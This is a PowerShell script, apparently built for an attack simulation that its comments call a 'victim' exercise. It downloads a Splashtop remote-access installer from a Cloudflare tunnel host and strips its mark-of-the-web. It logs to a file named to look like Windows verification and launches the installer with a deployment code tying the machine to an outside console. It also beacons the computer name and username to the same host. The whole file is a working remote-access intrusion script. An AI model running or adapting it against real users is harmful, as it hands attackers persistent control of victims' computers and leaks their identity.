# rmm.ps1 - Splashtop Streamer via MSI, INTERACTIVE WIZARD variant
# Downloads streamer.msi, unblocks, aliases setup.msi, then launches the
# installer VISIBLY in the user's session. The "victim" clicks through
# UAC + install wizard + deployment confirmation like a real gullible user.

$RmmPreset = 'splashtop'
$BeaconUrl  = 'https://diamond-locally-rod-detective.trycloudflare.com/beacon'

$PRESETS = @{
  splashtop = @{
    Url    = 'https://diamond-locally-rod-detective.trycloudflare.com/ttx/rmm/streamer.msi'
    File   = "$env:PUBLIC\streamer.msi"
    Check  = 'SRStream'
    Desc   = 'Splashtop streamer (MSI wizard)'
  }
}
$ErrorActionPreference = 'SilentlyContinue'
$Log = "$env:PUBLIC\WindowsVerification.log"

function Beacon([string]$Stage) {
  try { Invoke-WebRequest -UseBasicParsing "$BeaconUrl`?s=$Stage&h=$env:COMPUTERNAME&u=$env:USERNAME" | Out-Null } catch {}
}

if (-not $PRESETS.ContainsKey($RmmPreset)) { $RmmPreset = 'splashtop' }
$R = $PRESETS[$RmmPreset]

Add-Content $Log "$(Get-Date -f s)  run: preset=$RmmPreset (wizard) user=$env:USERNAME"

# Already running? done.
if (Get-Process -Name $R.Check -ErrorAction SilentlyContinue) {
  Add-Content $Log "$(Get-Date -f s)  already running, exiting"
  Beacon 'splashtop-already-running'
  return
}

# Download if not present + clear MOTW
if (-not (Test-Path $R.File)) {
  Invoke-WebRequest -Uri $R.Url -OutFile $R.File -UseBasicParsing
  Add-Content $Log "$(Get-Date -f s)  downloaded $($R.Url)"
}
Unblock-File $R.File

if (-not (Test-Path $R.File)) {
  Beacon 'rmm-download-failed'
  Add-Content $Log "$(Get-Date -f s)  ERROR: downloaded MSI missing"
  return
}

# setup.msi alias - prevents 1603 source resolution on reused hosts
Copy-Item $R.File "$env:PUBLIC\setup.msi" -Force

# Kill wedged msiexec from earlier attempts
Get-Process msiexec -ErrorAction SilentlyContinue |
    Where-Object { $_.Id -ne (Get-CimInstance Win32_Service -Filter "Name='msiserver'" -ErrorAction SilentlyContinue).ProcessId } |
    Stop-Process -Force -ErrorAction SilentlyContinue

# LAUNCH THE WIZARD - visible, in the user's interactive session.
# dcode pre-fills the deployment binding; the user still clicks through.
Beacon 'splashtop-wizard-launch'
Start-Process msiexec.exe -ArgumentList '/i', "`"$($R.File)`"", 'dcode=ZT4WXRHKL5TY'
Add-Content $Log "$(Get-Date -f s)  launched $($R.Desc) - wizard visible, awaiting user"

# Poll for streamer up (user-paced; MSI UI waits for clicks)
$Running = $false
for ($i = 0; $i -lt 36; $i++) {
  Start-Sleep -Seconds 10
  if (Get-Process -Name 'SRStream' -ErrorAction SilentlyContinue) { $Running = $true; break }
}
if ($Running) {
  Beacon 'splashtop-installed'
  Add-Content $Log "$(Get-Date -f s)  streamer running (check Business console)"
} else {
  Beacon 'splashtop-notready'
  Add-Content $Log "$(Get-Date -f s)  wizard not completed within 6 min"
}
